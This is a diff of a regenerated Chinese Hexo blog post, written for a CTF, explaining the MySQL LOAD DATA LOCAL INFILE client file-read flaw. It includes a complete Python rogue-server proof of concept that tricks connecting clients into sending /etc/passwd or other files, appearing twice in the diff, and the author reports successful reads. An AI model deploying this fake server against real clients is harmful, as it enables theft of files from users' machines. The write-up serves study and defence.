@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-<head><meta name="generator" content="Hexo 3.9.0">
+<head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
@@ -45,7 +45,7 @@
 <div class="nav" id="nav">
     <div class="avatar-name">
         <div class="avatar radius">
-            <img src="/img/avatar.jpg" />
+            <img src="/img/avatar.jpg">
         </div>
         <div class="name">
             <i>一筐萝卜</i>
@@ -53,25 +53,25 @@
     </div>
     <div class="contents" id="nav-content">
         <ul>
-            <li >
+            <li>
                 <a href="/">
                     <i class="iconfont icon-shouye1"></i>
                     <span>HOME</span>
                 </a>
             </li>
-            <li >
+            <li>
                 <a href="/tags">
                     <i class="iconfont icon-biaoqian1"></i>
                     <span>TAGS</span>
                 </a>
             </li>
-            <li >
+            <li>
                 <a href="/archives">
                     <i class="iconfont icon-guidang2"></i>
                     <span>ARCHIVES</span>
                 </a>
             </li>
-            <li >
+            <li>
                 <a href="/about/">
                     <i class="iconfont icon-guanyu2"></i>
                     <span>ABOUT</span>
@@ -99,7 +99,7 @@
     <div class="search-container">
         <div class="search-input">
             <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
-            <input id="search-input"/>
+            <input id="search-input">
             <span id="begin-search">search</span>
         </div>
         <div class="search-result-container" id="search-result-container">
@@ -135,16 +135,12 @@
         </span>
         <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
 </span>
-</span>
+
     </div>
     <div class="post-content no-indent">
-        <p>DDCTF中一道web题设计到了这个知识点</p>
-<a id="more"></a>
-
-
+        <p>DDCTF中一道web题设计到了这个知识点<br><a id="more"></a></p>
 <h3 id="知识前提"><a href="#知识前提" class="headerlink" title="知识前提"></a>知识前提</h3><p>在mysql中，读取一个文件中的内容并将其内容存到表中,SQL语句如下</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">infile</span> <span class="string">'/etc/passwd'</span> <span class="keyword">into</span> <span class="keyword">table</span> <span class="keyword">test</span>\_load\_file;</span><br><span class="line"><span class="keyword">load</span> <span class="keyword">data</span> <span class="keyword">local</span> <span class="keyword">infile</span> <span class="string">'/etc/passwd'</span> <span class="keyword">into</span> <span class="keyword">table</span> <span class="keyword">test</span>\_load\_file;</span><br></pre></td></tr></table></figure>
-
 <p>这两句虽然都是读取文件并存到表中的，但是是有一定的区别的，按照我的理解是，第一句SQL是讲mysql服务所在的机器上的文件存到数据库中，而第二句是讲连接mysql的机器上的文件存入到mysql中</p>
 <h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><ul>
 <li>本机 deepin 15.8 （充当服务器，IP：192.168.10.198）</li>
@@ -157,8 +153,7 @@
 </li>
 <li><p>然后服务器想客户端返回了一个所要请求的文件path<br><img src="https://s2.ax1x.com/2019/04/23/EEAit0.png" alt> </p>
 </li>
-<li><p>然后客户端向服务器发送了path文件的内容<br><img src="https://s2.ax1x.com/2019/04/23/EEAE1U.png" alt><br>可以发现这个文件的内容就是客户端机器上的文件</p>
-</li>
+<li>然后客户端向服务器发送了path文件的内容<br><img src="https://s2.ax1x.com/2019/04/23/EEAE1U.png" alt><br>可以发现这个文件的内容就是客户端机器上的文件</li>
 </ul>
 <h3 id="漏洞实现"><a href="#漏洞实现" class="headerlink" title="漏洞实现"></a>漏洞实现</h3><p>正常情况下，这个流程是没有什么问题的，但是如果我们伪造一个服务器端，然后想客户端回复一个我们想要获取的文件，那么就达到了任意文件读取的目的</p>
 <blockquote>
@@ -166,17 +161,13 @@
 </blockquote>
 <h3 id="伪造服务端"><a href="#伪造服务端" class="headerlink" title="伪造服务端"></a>伪造服务端</h3><p>在官方文档中已经给出来当执行load data local SQL语句时具体的传输的数据<br><img src="https://s2.ax1x.com/2019/04/23/EEAVcF.png" alt> </p>
 <h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>c <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> fb <span class="number">2</span>f <span class="number">65</span> <span class="number">74</span>    <span class="number">63</span> <span class="number">2</span>f <span class="number">70</span> <span class="number">61</span> <span class="number">73</span> <span class="number">73</span> <span class="number">77</span> <span class="number">64</span>    ...../etc/passwd</span><br></pre></td></tr></table></figure>
-
 <p>0x0c是数据包的长度（从0xfb开始计算），000001表示数据包的序号，0xfb代表数据包的类型，接着后面是要读取的文件名字<br><img src="https://s2.ax1x.com/2019/04/23/EEAmnJ.png" alt> </p>
 <h4 id="greeting数据包"><a href="#greeting数据包" class="headerlink" title="greeting数据包"></a>greeting数据包</h4><p>在官方文档中也有，但是不好伪造，我们可以直接从刚刚抓取到的数据保重拷贝一份就好了</p>
 <p><img src="https://s2.ax1x.com/2019/04/23/EEAMA1.png" alt> </p>
-<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p><a href="https://www.vesiluoma.com/abusing-mysql-clients/" target="_blank" rel="noopener">POC来源</a> </p>
-<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#coding: utf8</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line"># linux :</span><br><span class="line">filestring = "/etc/passwd"</span><br><span class="line"># windows:</span><br><span class="line">#filestring = "C:<span class="symbol">\\</span>Windows<span class="symbol">\\</span>system32<span class="symbol">\\</span>drivers<span class="symbol">\\</span>etc<span class="symbol">\\</span>hosts"</span><br><span class="line">HOST = "0.0.0.0" # open for eeeeveryone! ^_^</span><br><span class="line">PORT = 3307</span><br><span class="line">BUFFER_SIZE = 1024</span><br><span class="line"></span><br><span class="line">#1 Greeting</span><br><span class="line">greeting = "<span class="symbol">\x</span>4c<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>0a<span class="symbol">\x</span>35<span class="symbol">\x</span>2e<span class="symbol">\x</span>36<span class="symbol">\x</span>2e<span class="symbol">\x</span>33<span class="symbol">\x</span>30<span class="symbol">\x</span>2d<span class="symbol">\x</span>31<span class="symbol">\x</span>00<span class="symbol">\x</span>06<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>39<span class="symbol">\x</span>40<span class="symbol">\x</span>74<span class="symbol">\x</span>4a<span class="symbol">\x</span>52<span class="symbol">\x</span>3d<span class="symbol">\x</span>78<span class="symbol">\x</span>67<span class="symbol">\x</span>00<span class="symbol">\x</span>ff<span class="symbol">\x</span>f7<span class="symbol">\x</span>08<span class="symbol">\x</span>02<span class="symbol">\x</span>00<span class="symbol">\x</span>7f<span class="symbol">\x</span>80<span class="symbol">\x</span>15<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>7c<span class="symbol">\x</span>59<span class="symbol">\x</span>28<span class="symbol">\x</span>57<span class="symbol">\x</span>61<span class="symbol">\x</span>63<span class="symbol">\x</span>4b<span class="symbol">\x</span>30<span class="symbol">\x</span>49<span class="symbol">\x</span>61<span class="symbol">\x</span>2e<span class="symbol">\x</span>5c<span class="symbol">\x</span>00<span class="symbol">\x</span>6d<span class="symbol">\x</span>79<span class="symbol">\x</span>73<span class="symbol">\x</span>71<span class="symbol">\x</span>6c<span class="symbol">\x</span>5f<span class="symbol">\x</span>6e<span class="symbol">\x</span>61<span class="symbol">\x</span>74<span class="symbol">\x</span>69<span class="symbol">\x</span>76<span class="symbol">\x</span>65<span class="symbol">\x</span>5f<span class="symbol">\x</span>70<span class="symbol">\x</span>61<span class="symbol">\x</span>73<span class="symbol">\x</span>73<span class="symbol">\x</span>77<span class="symbol">\x</span>6f<span class="symbol">\x</span>72<span class="symbol">\x</span>64<span class="symbol">\x</span>00"</span><br><span class="line">#2 Accept all authentications</span><br><span class="line">authok = "<span class="symbol">\x</span>07<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>02<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>02<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00"</span><br><span class="line"></span><br><span class="line">#3 Payload</span><br><span class="line">#数据包长度</span><br><span class="line">payloadlen = "<span class="symbol">\x</span>0c"</span><br><span class="line">padding = "<span class="symbol">\x</span>00<span class="symbol">\x</span>00"</span><br><span class="line">payload = payloadlen + padding +  "<span class="symbol">\x</span>01<span class="symbol">\x</span>fb<span class="symbol">\x</span>2f<span class="symbol">\x</span>65<span class="symbol">\x</span>74<span class="symbol">\x</span>63<span class="symbol">\x</span>2f<span class="symbol">\x</span>70<span class="symbol">\x</span>61<span class="symbol">\x</span>73<span class="symbol">\x</span>73<span class="symbol">\x</span>77<span class="symbol">\x</span>64"</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line">s.bind((HOST, PORT))</span><br><span class="line">s.listen(1)</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    conn, addr = s.accept()</span><br><span class="line"></span><br><span class="line">    print 'Connection from:', addr</span><br><span class="line">    conn.send(greeting)</span><br><span class="line">    while True:</span><br><span class="line">        data = conn.recv(BUFFER_SIZE)</span><br><span class="line">        print " ".join("<span class="variable">%02x" %</span> ord(i) for i in data)</span><br><span class="line">        conn.send(authok)</span><br><span class="line">        data = conn.recv(BUFFER_SIZE)</span><br><span class="line">        conn.send(payload)</span><br><span class="line">        print "[*] Payload send!"</span><br><span class="line">        data = conn.recv(BUFFER_SIZE)</span><br><span class="line">        if not data: break</span><br><span class="line">        print "Data received:", data</span><br><span class="line">        break</span><br><span class="line">    # Don't leave the connection open.</span><br><span class="line">    conn.close()</span><br></pre></td></tr></table></figure>
-
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p><a href="https://www.vesiluoma.com/abusing-mysql-clients/" target="_blank" rel="noopener">POC来源</a><br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">#coding: utf8</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line"># linux :</span><br><span class="line">filestring = "/etc/passwd"</span><br><span class="line"># windows:</span><br><span class="line">#filestring = "C:<span class="symbol">\\</span>Windows<span class="symbol">\\</span>system32<span class="symbol">\\</span>drivers<span class="symbol">\\</span>etc<span class="symbol">\\</span>hosts"</span><br><span class="line">HOST = "0.0.0.0" # open for eeeeveryone! ^_^</span><br><span class="line">PORT = 3307</span><br><span class="line">BUFFER_SIZE = 1024</span><br><span class="line"></span><br><span class="line">#1 Greeting</span><br><span class="line">greeting = "<span class="symbol">\x</span>4c<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>0a<span class="symbol">\x</span>35<span class="symbol">\x</span>2e<span class="symbol">\x</span>36<span class="symbol">\x</span>2e<span class="symbol">\x</span>33<span class="symbol">\x</span>30<span class="symbol">\x</span>2d<span class="symbol">\x</span>31<span class="symbol">\x</span>00<span class="symbol">\x</span>06<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>39<span class="symbol">\x</span>40<span class="symbol">\x</span>74<span class="symbol">\x</span>4a<span class="symbol">\x</span>52<span class="symbol">\x</span>3d<span class="symbol">\x</span>78<span class="symbol">\x</span>67<span class="symbol">\x</span>00<span class="symbol">\x</span>ff<span class="symbol">\x</span>f7<span class="symbol">\x</span>08<span class="symbol">\x</span>02<span class="symbol">\x</span>00<span class="symbol">\x</span>7f<span class="symbol">\x</span>80<span class="symbol">\x</span>15<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>7c<span class="symbol">\x</span>59<span class="symbol">\x</span>28<span class="symbol">\x</span>57<span class="symbol">\x</span>61<span class="symbol">\x</span>63<span class="symbol">\x</span>4b<span class="symbol">\x</span>30<span class="symbol">\x</span>49<span class="symbol">\x</span>61<span class="symbol">\x</span>2e<span class="symbol">\x</span>5c<span class="symbol">\x</span>00<span class="symbol">\x</span>6d<span class="symbol">\x</span>79<span class="symbol">\x</span>73<span class="symbol">\x</span>71<span class="symbol">\x</span>6c<span class="symbol">\x</span>5f<span class="symbol">\x</span>6e<span class="symbol">\x</span>61<span class="symbol">\x</span>74<span class="symbol">\x</span>69<span class="symbol">\x</span>76<span class="symbol">\x</span>65<span class="symbol">\x</span>5f<span class="symbol">\x</span>70<span class="symbol">\x</span>61<span class="symbol">\x</span>73<span class="symbol">\x</span>73<span class="symbol">\x</span>77<span class="symbol">\x</span>6f<span class="symbol">\x</span>72<span class="symbol">\x</span>64<span class="symbol">\x</span>00"</span><br><span class="line">#2 Accept all authentications</span><br><span class="line">authok = "<span class="symbol">\x</span>07<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>02<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>02<span class="symbol">\x</span>00<span class="symbol">\x</span>00<span class="symbol">\x</span>00"</span><br><span class="line"></span><br><span class="line">#3 Payload</span><br><span class="line">#数据包长度</span><br><span class="line">payloadlen = "<span class="symbol">\x</span>0c"</span><br><span class="line">padding = "<span class="symbol">\x</span>00<span class="symbol">\x</span>00"</span><br><span class="line">payload = payloadlen + padding +  "<span class="symbol">\x</span>01<span class="symbol">\x</span>fb<span class="symbol">\x</span>2f<span class="symbol">\x</span>65<span class="symbol">\x</span>74<span class="symbol">\x</span>63<span class="symbol">\x</span>2f<span class="symbol">\x</span>70<span class="symbol">\x</span>61<span class="symbol">\x</span>73<span class="symbol">\x</span>73<span class="symbol">\x</span>77<span class="symbol">\x</span>64"</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)</span><br><span class="line">s.bind((HOST, PORT))</span><br><span class="line">s.listen(1)</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    conn, addr = s.accept()</span><br><span class="line"></span><br><span class="line">    print 'Connection from:', addr</span><br><span class="line">    conn.send(greeting)</span><br><span class="line">    while True:</span><br><span class="line">        data = conn.recv(BUFFER_SIZE)</span><br><span class="line">        print " ".join("<span class="variable">%02x" %</span> ord(i) for i in data)</span><br><span class="line">        conn.send(authok)</span><br><span class="line">        data = conn.recv(BUFFER_SIZE)</span><br><span class="line">        conn.send(payload)</span><br><span class="line">        print "[*] Payload send!"</span><br><span class="line">        data = conn.recv(BUFFER_SIZE)</span><br><span class="line">        if not data: break</span><br><span class="line">        print "Data received:", data</span><br><span class="line">        break</span><br><span class="line">    # Don't leave the connection open.</span><br><span class="line">    conn.close()</span><br></pre></td></tr></table></figure></p>
 <p>首先读取/etc/passwd，看看是否能成功<br><img src="https://s2.ax1x.com/2019/04/23/EEAfNq.png" alt><br>发现确实成功的读取了</p>
 <p>再来测试一下读取/var/www/html/1.txt文件<br><img src="https://s2.ax1x.com/2019/04/23/EEAlh6.png" alt><br>成功读取</p>
 <h4 id="Python-with-MySQLdb"><a href="#Python-with-MySQLdb" class="headerlink" title="Python with MySQLdb"></a>Python with MySQLdb</h4><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">import</span> MySQLdb</span><br><span class="line"><span class="attr">db</span> = MySQLdb.connect(<span class="string">"192.168.10.198"</span>,<span class="string">"root"</span>,<span class="string">"sadsd"</span>,<span class="string">"test"</span>,<span class="attr">port=3307);</span></span><br></pre></td></tr></table></figure>
-
 <p><img src="https://s2.ax1x.com/2019/04/23/EEAD9f.png" alt> </p>
 <blockquote>
 <p>还适用于PHP with mysqli、 PHP with PDO、Python with MySQLdb、Python3 with mysqlclient、Java with JDBC Driver</p>
@@ -184,7 +175,7 @@
 <h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p><a href="https://lightless.me/archives/read-mysql-client-file.html" target="_blank" rel="noopener">不发光的博客</a><br><a href="https://www.smi1e.top/mysql-load-data-%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6/" target="_blank" rel="noopener">Smi1e</a> </p>
 
         
-        <br />
+        <br>
         <div id="comment-container">
         </div>
         <div id="disqus_thread"></div>
@@ -216,7 +207,7 @@
     
     <p>
         <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-        转发请备注<a href=“https://luobuming.github.io”>一筐萝卜</a>的个人博客 <br>
+        转发请备注<a href="“https://luobuming.github.io”">一筐萝卜</a>的个人博客 <br>
         本站总访问量<span id="busuanzi_value_site_pv"></span>次
        </p>
 </footer>
